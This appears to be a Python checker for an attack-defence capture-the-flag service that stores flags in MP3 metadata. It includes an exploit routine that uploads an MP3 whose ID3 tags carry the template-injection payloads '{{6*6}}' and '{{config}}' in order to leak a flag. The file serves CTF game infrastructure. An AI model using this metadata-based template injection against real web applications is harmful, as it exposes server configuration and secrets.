"""
CHECKER FUNCTIONS
"""
import enochecker3
import secrets
from typing import Optional

from httpx import AsyncClient

from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import mp3_helper
import utils
import faker
import logging
import eyed3
import base64

FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
checker = Enochecker("t3chn0r4d10", 8001)
app = lambda: checker.app

password = str(secrets.token_hex(16))
username = "admin"


def setup_logger(log_file):
    logger = logging.getLogger("technoradio_logger")
    logger.setLevel(logging.DEBUG)

    # Create a file handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)

    # Create a console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)

    # Create a formatter and add it to the handlers
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    # Add the handlers to the logger
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    return logger


logger = setup_logger("logs.txt")


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    logger.info("START PUTFLAG")
    # Second file is in config which gets loaded from a file
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("admin.mp3")
    mp3_helper.create_modify_mp3("admin.mp3", "Flag", "FindMe", "Techno")
    logger.info("Trying to login...")
    response = await utils.register_user_and_login(client, username, password, logger)
    logger.info("Admin LOGGED IN")
    # Try to upload mp3 to page
    with open("admin.mp3", "rb") as file:
        audio = eyed3.load("admin.mp3")
        audio.tag.comments.set(
            "FLAG" + utils.encode_to_base64(task.flag, logger) + "FLAGEND"
        )
        audio.tag.save()
        files = {"mp3-file": file}
        logger.info("Tries to upload to home")

        response = await client.post("/home", files=files)

        if response.status_code == 200:
            logger.info("UPLOADED FLAG Successfully: " + task.flag)
        else:
            logger.warning("UPLOADING FLAG FAILED!!! " + str(response.status_code))
            logger.info("HTML: " + response.text)
            raise MumbleException("Upload failed")


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # login and check that file exists
    logger.info("START get flag, try to loggin")
    await utils.login(client, username, password, logger)
    logger.info("Try getting admin mp3 file")
    response = await client.get("/UPLOAD_FOLDER/admin.mp3")
    # Find flag in response text
    assert_equals(response.status_code, 200, "Didn't find file")
    logger.info("SUCCESSFULLY REACHED MP3 file")
    # Find b64 flag
    base_64_flag = utils.find_string_between_flags(response.text, True)
    # Decode flag
    flag_text = utils.decode_from_base64(base_64_flag, logger)
    logger.info("Founded flag is " + flag_text)
    assert_in(task.flag, flag_text, "Flag don't eqauls current flag")


@checker.exploit(0)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("exploit.mp3")
    mp3_helper.create_modify_mp3("exploit.mp3", "{{6*6}}", "{{config}}", "Techno")
    # register
    await utils.register_user_and_login(client, "eve", "IamAliceISwear", logger)
    file_path = "./exploit.mp3"
    # Try to upload mp3 to page
    with open(file_path, "rb") as file:
        files = {"mp3-file": file}

        response = await client.post("/home", files=files)

        if response.status_code == 200:
            logger.info("Attack Upload success")
        else:
            logger.warning("Attack upload failed")
            logger.info("HTML: " + response.text)
            raise MumbleException("Upload failed")

    # Find flag in response text
    base_64_flag = utils.find_string_between_flags(response.text, False)
    if base_64_flag is None:
        logger.warning("NO FLAG in FILE, Flag b64 text was empty")
        raise MumbleException("NO Flag found")
    flag_text = utils.decode_from_base64(base_64_flag, logger)
    if flag_text is None:
        logger.warning("NO FLAG in FILE, Flag text was empty")
        raise MumbleException("NO Flag found")
    if flag := searcher.search_flag(flag_text):
        logger.info("SUCCESSFULLY OBTAINED FLAG BY ATTACK: " + flag_text)
        return flag
    logger.warning("NOT the right FLAG in FILE, decoding failed: " + flag_text)
    raise MumbleException("Wrong Flag found")
